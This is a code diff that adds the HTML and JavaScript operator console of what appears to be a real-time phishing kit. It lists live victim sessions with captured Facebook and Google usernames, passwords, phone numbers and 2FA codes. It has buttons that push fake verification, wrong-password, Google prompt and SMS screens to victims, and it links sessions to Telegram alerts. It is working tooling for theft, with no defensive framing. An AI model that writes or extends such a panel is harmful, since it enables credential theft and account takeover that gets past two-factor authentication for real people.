@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Panel</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #0f1117;
+      color: #e2e8f0;
+      min-height: 100vh;
+      padding: 24px 16px;
+    }
+
+    /* ── Header ── */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 900px;
+      margin: 0 auto 14px;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .header h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: .5px;
+    }
+    .header .live-dot {
+      width: 9px; height: 9px;
+      background: #22c55e;
+      border-radius: 50%;
+      display: inline-block;
+      margin-right: 8px;
+      animation: pulse 1.8s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity: 1; }
+      50%      { opacity: .3; }
+    }
+    .header-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .online-count {
+      font-size: 13px;
+      color: #94a3b8;
+      background: #1e2130;
+      padding: 5px 12px;
+      border-radius: 20px;
+      white-space: nowrap;
+    }
+
+    /* ── Search bar ── */
+    .search-wrap {
+      max-width: 900px;
+      margin: 0 auto 20px;
+      position: relative;
+    }
+    .search-wrap input {
+      width: 100%;
+      background: #1a1d2e;
+      border: 1px solid #2d3148;
+      border-radius: 10px;
+      padding: 9px 14px 9px 38px;
+      color: #e2e8f0;
+      font-size: 13px;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .search-wrap input:focus { border-color: #4285F4; }
+    .search-wrap input::placeholder { color: #475569; }
+    .search-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #475569;
+      font-size: 15px;
+      pointer-events: none;
+    }
+
+    /* ── Section divider ── */
+    .section-label {
+      max-width: 900px;
+      margin: 0 auto 10px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #475569;
+      padding-left: 4px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .section-label::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #2d3148;
+    }
+
+    /* ── Empty state ── */
+    .empty {
+      text-align: center;
+      color: #475569;
+      padding: 60px 0;
+      font-size: 15px;
+    }
+
+    /* ── User Card ── */
+    .user-card {
+      background: #1a1d2e;
+      border: 1px solid #2d3148;
+      border-radius: 14px;
+      max-width: 900px;
+      margin: 0 auto 14px;
+      overflow: hidden;
+      transition: border-color .2s, opacity .2s;
+    }
+    .user-card.connected    { border-left: 4px solid #22c55e; }
+    .user-card.disconnected { border-left: 4px solid #3d4060; opacity: .75; }
+    .user-card.hidden       { display: none; }
+
+    /* Card header row */
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px 10px;
+      border-bottom: 1px solid #2d3148;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .card-header-left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+
+    /* Short ID tag — the main identifier to match with Telegram */
+    .short-id {
+      font-size: 15px;
+      font-weight: 700;
+      font-family: monospace;
+      color: #fff;
+      background: #22272e;
+      border: 1px solid #2d3148;
+      border-radius: 7px;
+      padding: 3px 9px;
+      letter-spacing: .5px;
+      cursor: pointer;
+      user-select: none;
+      transition: background .15s;
+      flex-shrink: 0;
+    }
+    .short-id:hover { background: #2d3148; }
+    .short-id:active { background: #3d4570; }
+
+    .status-dot {
+      width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0;
+    }
+    .status-dot.on  { background: #22c55e; box-shadow: 0 0 6px #22c55e88; }
+    .status-dot.off { background: #475569; }
+
+    .badge-page {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: 20px;
+      background: #1e2d40;
+      color: #60a5fa;
+      border: 1px solid #2563eb44;
+    }
+    .badge-new {
+      background: #ef4444;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 20px;
+      letter-spacing: .5px;
+    }
+    .badge-action {
+      background: #1e3a5f;
+      color: #60a5fa;
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 20px;
+    }
+    .card-header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .card-time {
+      font-size: 11px;
+      color: #475569;
+      white-space: nowrap;
+    }
+    .status-label {
+      font-size: 11px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .status-label.on  { color: #22c55e; }
+    .status-label.off { color: #64748b; }
+    .btn-dismiss {
+      background: none;
+      border: none;
+      color: #475569;
+      font-size: 16px;
+      cursor: pointer;
+      padding: 0 2px;
+      line-height: 1;
+      transition: color .15s;
+    }
+    .btn-dismiss:hover { color: #ef4444; }
+
+    /* Info grid */
+    .card-info {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 6px;
+      padding: 10px 16px;
+      border-bottom: 1px solid #2d3148;
+    }
+    .info-item { font-size: 12px; color: #94a3b8; }
+    .info-item strong { color: #cbd5e1; }
+
+    /* Credentials row */
+    .creds-row {
+      padding: 10px 16px;
+      border-bottom: 1px solid #2d3148;
+      font-size: 13px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .cred-block {
+      background: #0f1117;
+      border-radius: 8px;
+      padding: 6px 12px;
+      flex: 1;
+      min-width: 160px;
+    }
+    .cred-block .cred-label { font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 3px; }
+    .cred-block .cred-value { color: #e2e8f0; font-family: monospace; word-break: break-all; font-size: 12px; }
+    .cred-block.google   { border-left: 3px solid #4285F4; }
+    .cred-block.facebook { border-left: 3px solid #1877f2; }
+    .cred-block.codes    { border-left: 3px solid #8b5cf6; }
+
+    /* Button sections */
+    .card-actions { padding: 10px 16px 14px; display: flex; flex-direction: column; gap: 10px; }
+    .action-group-label {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: .8px;
+      color: #475569;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .btn-row { display: flex; flex-wrap: wrap; gap: 5px; }
+
+    .btn {
+      padding: 6px 12px;
+      border: none;
+      border-radius: 7px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity .15s, transform .1s;
+      white-space: nowrap;
+    }
+    .btn:hover  { opacity: .85; }
+    .btn:active { transform: scale(.96); }
+
+    .btn-2fa    { background: #2563eb; color: #fff; }
+    .btn-auth   { background: #7c3aed; color: #fff; }
+    .btn-email  { background: #059669; color: #fff; }
+    .btn-wh     { background: #16a34a; color: #fff; }
+    .btn-wrong  { background: #dc2626; color: #fff; }
+    .btn-old    { background: #d97706; color: #fff; }
+    .btn-cal    { background: #0891b2; color: #fff; }
+
+    .btn-glogin  { background: #4285F4; color: #fff; }
+    .btn-gwrong  { background: #EA4335; color: #fff; }
+    .btn-gphone  { background: #0F9D58; color: #fff; }
+    .btn-gprompt { background: #1a73e8; color: #fff; }
+    .btn-gsms    { background: #0097A7; color: #fff; }
+    .btn-gauth   { background: #5e35b1; color: #fff; }
+    .btn-wnum    { background: #991b1b; color: #fff; }
+    .btn-wcode   { background: #7f1d1d; color: #fff; }
+    .btn-wacode  { background: #6b21a8; color: #fff; }
+
+    .btn-ban { background: #1e1e2e; color: #ef4444; border: 1px solid #ef444455; }
+    .btn-ban:hover { background: #ef4444; color: #fff; }
+
+    /* Toast */
+    #toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #22c55e;
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      opacity: 0;
+      transition: opacity .3s;
+      z-index: 999;
+      pointer-events: none;
+    }
+    #toast.show { opacity: 1; }
+    #toast.err  { background: #ef4444; }
+
+    /* Copied flash */
+    .short-id.copied { background: #14532d !important; color: #4ade80; }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <h1><span class="live-dot"></span>Admin Panel</h1>
+    <div class="header-right">
+      <span class="online-count" id="onlineCount">0 online</span>
+    </div>
+  </div>
+
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input type="text" id="searchInput" placeholder="Search by ID, IP or email…" oninput="filterCards()"/>
+  </div>
+
+  <div id="users-container"></div>
+  <div id="toast"></div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io('/panel');
+    const container = document.getElementById('users-container');
+    const onlineCount = document.getElementById('onlineCount');
+    const searchInput = document.getElementById('searchInput');
+    const toast = document.getElementById('toast');
+    let toastTimer;
+    let lastUsers = [];
+
+    function showToast(msg, isErr = false) {
+      clearTimeout(toastTimer);
+      toast.textContent = msg;
+      toast.className = 'show' + (isErr ? ' err' : '');
+      toastTimer = setTimeout(() => toast.className = '', 2500);
+    }
+
+    function copyId(fullId, el) {
+      navigator.clipboard.writeText(fullId).then(() => {
+        el.classList.add('copied');
+        el.title = 'Copied!';
+        setTimeout(() => { el.classList.remove('copied'); el.title = 'Click to copy full ID'; }, 1200);
+      });
+    }
+
+    function filterCards() {
+      const q = searchInput.value.trim().toLowerCase();
+      document.querySelectorAll('.user-card[data-search]').forEach(card => {
+        card.classList.toggle('hidden', q.length > 0 && !card.dataset.search.includes(q));
+      });
+      updateSectionVisibility();
+    }
+
+    function updateSectionVisibility() {
+      document.querySelectorAll('.section-label').forEach(label => {
+        const next = label.nextElementSibling;
+        if (!next) return;
+        // hide section header if all cards in its group are hidden
+        let sibling = next;
+        let anyVisible = false;
+        while (sibling && !sibling.classList.contains('section-label')) {
+          if (sibling.classList.contains('user-card') && !sibling.classList.contains('hidden')) anyVisible = true;
+          sibling = sibling.nextElementSibling;
+        }
+        label.style.display = anyVisible ? '' : 'none';
+      });
+    }
+
+    socket.on('connect',       () => socket.emit('get-users'));
+    socket.on('panel-success', d => showToast('✅ ' + d.message));
+    socket.on('panel-error',   d => showToast('❌ ' + d.message, true));
+    setInterval(() => { if (socket.connected) socket.emit('get-users'); }, 4000);
+
+    socket.on('update-users', ({ users, newUsers }) => {
+      lastUsers = users;
+      const connectedCount = users.filter(u => u.isConnected).length;
+      onlineCount.textContent = connectedCount + ' online';
+
+      container.innerHTML = '';
+
+      if (!users.length) {
+        container.innerHTML = '<p class="empty">No active sessions yet.</p>';
+        return;
+      }
+
+      /* Sort: connected first, then disconnected */
+      const sorted = [...users].sort((a, b) => {
+        if (a.isConnected === b.isConnected) return (b.time?.timestamp || 0) - (a.time?.timestamp || 0);
+        return a.isConnected ? -1 : 1;
+      });
+
+      const connected    = sorted.filter(u => u.isConnected);
+      const disconnected = sorted.filter(u => !u.isConnected);
+
+      if (connected.length) {
+        const lbl = document.createElement('div');
+        lbl.className = 'section-label';
+        lbl.textContent = '🟢 Connected — ' + connected.length;
+        container.appendChild(lbl);
+        connected.forEach(u => container.appendChild(buildCard(u, newUsers)));
+      }
+
+      if (disconnected.length) {
+        const lbl = document.createElement('div');
+        lbl.className = 'section-label';
+        lbl.textContent = '⚫ Disconnected — ' + disconnected.length;
+        container.appendChild(lbl);
+        disconnected.forEach(u => container.appendChild(buildCard(u, newUsers)));
+      }
+
+      filterCards();
+    });
+
+    function buildCard(user, newUsers) {
+      const isNew  = newUsers.includes(user.id);
+      const online = user.isConnected;
+      const gl     = user.googleLogin || {};
+      const gc     = user.googleCodes || [];
+      const codes  = (user.codes || []).join(', ') || '—';
+      const fbUser = user.login?.username || '—';
+      const fbPass = user.login?.password || '—';
+
+      /* Short ID = first 8 chars — matches what Telegram shows */
+      const shortId = user.id.slice(0, 8).toUpperCase();
+
+      /* Page badge */
+      const pageName = user.page || '';
+      const pageBadge = pageName ? `<span class="badge-page">${pageName}</span>` : '';
+
+      /* Search index: id + ip + email */
+      const searchStr = [user.id, user.ip, fbUser, gl.email].filter(Boolean).join(' ').toLowerCase();
+
+      const card = document.createElement('div');
+      card.className = 'user-card ' + (online ? 'connected' : 'disconnected');
+      card.dataset.search = searchStr;
+
+      card.innerHTML = `
+        <div class="card-header">
+          <div class="card-header-left">
+            <span class="status-dot ${online ? 'on' : 'off'}"></span>
+            <span class="short-id" title="Click to copy full ID" onclick="copyId('${user.id}', this)">#${shortId}</span>
+            ${pageBadge}
+            ${isNew ? '<span class="badge-new">NEW</span>' : ''}
+            ${user.action ? `<span class="badge-action">${user.action}</span>` : ''}
+          </div>
+          <div class="card-header-right">
+            <span class="status-label ${online ? 'on' : 'off'}">${online ? '● Live' : '○ Offline'}</span>
+            <span class="card-time">${user.time?.time || ''} · ${user.time?.date || ''}</span>
+            <button class="btn-dismiss" title="Remove from panel" onclick="dismiss('${user.id}')">✕</button>
+          </div>
+        </div>
+
+        <div class="card-info">
+          <div class="info-item">🌐 <strong>IP</strong> ${user.ip || '—'}</div>
+          <div class="info-item">🖥 <strong>Browser</strong> ${user.userAgent ? user.userAgent.split(' ').slice(-1)[0] : '—'}</div>
+          <div class="info-item" style="font-size:10px;color:#475569;font-family:monospace;word-break:break-all">${user.id}</div>
+        </div>
+
+        <div class="creds-row">
+          <div class="cred-block facebook">
+            <div class="cred-label">Facebook Login</div>
+            <div class="cred-value">${fbUser} · ${fbPass}</div>
+          </div>
+          <div class="cred-block google">
+            <div class="cred-label">Google Login</div>
+            <div class="cred-value">${[gl.email, gl.password, gl.phone || gl.smsPhone].filter(Boolean).join(' · ') || '—'}</div>
+          </div>
+          <div class="cred-block codes">
+            <div class="cred-label">Codes</div>
+            <div class="cred-value">${codes}${gc.length ? ' · Gmail: ' + gc.join(', ') : ''}</div>
+          </div>
+        </div>
+
+        <div class="card-actions">
+          <div class="action-group">
+            <div class="action-group-label">📘 Facebook</div>
+            <div class="btn-row">
+              <button class="btn btn-2fa"   onclick="send('send-sms','${user.id}')">2FA SMS</button>
+              <button class="btn btn-auth"  onclick="send('send-auth','${user.id}')">Auth App</button>
+              <button class="btn btn-email" onclick="send('send-email','${user.id}')">Email Code</button>
+              <button class="btn btn-wh"    onclick="send('send-wh','${user.id}')">WhatsApp</button>
+              <button class="btn btn-wrong" onclick="send('send-wrong-creds','${user.id}')">Wrong Creds</button>
+              <button class="btn btn-old"   onclick="send('send-old-pass','${user.id}')">Old Password</button>
+              <button class="btn btn-cal"   onclick="send('send-calendar','${user.id}')">Calendly</button>
+            </div>
+          </div>
+
+          <div class="action-group">
+            <div class="action-group-label">🔵 Google</div>
+            <div class="btn-row">
+              <button class="btn btn-glogin"  onclick="send('send-google-login','${user.id}')">Google Login</button>
+              <button class="btn btn-gwrong"  onclick="send('send-gmail-wrong-pass','${user.id}')">Gmail Wrong Pass</button>
+              <button class="btn btn-gphone"  onclick="sendGooglePhone('${user.id}')">Phone Step</button>
+              <button class="btn btn-gprompt" onclick="sendGooglePrompt('${user.id}')">Prompt</button>
+              <button class="btn btn-gsms"    onclick="sendGoogleSMS('${user.id}')">Google SMS</button>
+              <button class="btn btn-gauth"   onclick="send('send-google-auth','${user.id}')">Google Auth</button>
+              <button class="btn btn-wnum"    onclick="send('send-google-wrong-number','${user.id}')">Wrong Number</button>
+              <button class="btn btn-wcode"   onclick="send('send-google-wrong-code','${user.id}')">Wrong Code</button>
+              <button class="btn btn-wacode"  onclick="send('send-google-wrong-auth-code','${user.id}')">Wrong Auth Code</button>
+            </div>
+          </div>
+
+          <div class="action-group">
+            <div class="action-group-label">⚠️ Danger</div>
+            <div class="btn-row">
+              <button class="btn btn-ban" onclick="banIp('${user.id}')">🚫 Ban IP</button>
+            </div>
+          </div>
+        </div>
+      `;
+
+      return card;
+    }
+
+    /* ── Helpers ── */
+    function send(event, userId) {
+      socket.emit(event, userId);
+      showToast('Sent: ' + event.replace('send-', ''));
+    }
+
+    function dismiss(userId) {
+      socket.emit('dismiss-user', userId);
+      /* Remove card immediately from UI */
+      document.querySelectorAll('.user-card[data-search]').forEach(card => {
+        if (card.dataset.search.startsWith(userId.toLowerCase())) card.remove();
+      });
+      updateSectionVisibility();
+      showToast('Session removed');
+    }
+
+    function banIp(userId) {
+      if (confirm('Ban this user\'s IP?\n' + userId)) {
+        socket.emit('ban-ip', userId);
+        showToast('IP Banned', true);
+      }
+    }
+
+    function sendGooglePhone(userId) {
+      const prefix = prompt('Country phone code (e.g. 47 for Norway, 1 for US):');
+      if (prefix?.trim()) {
+        socket.emit('send-google-phone', userId, prefix.trim().replace(/^\+/, ''));
+        showToast('Sent: Google Phone');
+      }
+    }
+
+    function sendGooglePrompt(userId) {
+      const number = prompt('2-digit number to show on Google Prompt (e.g. 58):');
+      if (!number?.trim()) return;
+      const device = prompt('Device name (leave blank for "your phone"):') || 'your phone';
+      socket.emit('send-google-prompt', userId, { number: number.trim(), device: device.trim() });
+      showToast('Sent: Google Prompt');
+    }
+
+    function sendGoogleSMS(userId) {
+      const prefix = prompt('Country phone code (e.g. 47):');
+      if (!prefix?.trim()) return;
+      const lastTwo = prompt('Last 2 digits of phone number (e.g. 92):');
+      if (lastTwo === null) return;
+      const digits = lastTwo.trim().replace(/\D/g, '').slice(-2).padStart(2, '0');
+      socket.emit('send-google-sms', userId, { prefix: prefix.trim().replace(/^\+/, ''), lastTwo: digits });
+      showToast('Sent: Google SMS');
+    }
+  </script>
+</body>
+</html>
